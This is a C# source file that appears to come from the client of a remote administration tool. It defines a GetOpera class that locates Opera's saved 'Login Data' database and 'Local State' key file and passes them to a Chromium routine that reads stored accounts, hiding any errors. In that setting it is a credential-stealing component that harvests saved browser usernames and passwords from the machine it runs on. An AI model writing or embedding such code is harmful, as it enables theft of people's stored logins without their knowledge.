using Comet.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Comet.Client.Recovery.Browsers
{
    public class GetOpera : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Opera";

        /// <inheritdoc />
        public override IEnumerable<SaveUser> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<SaveUser>();
            }
        }
    }
}
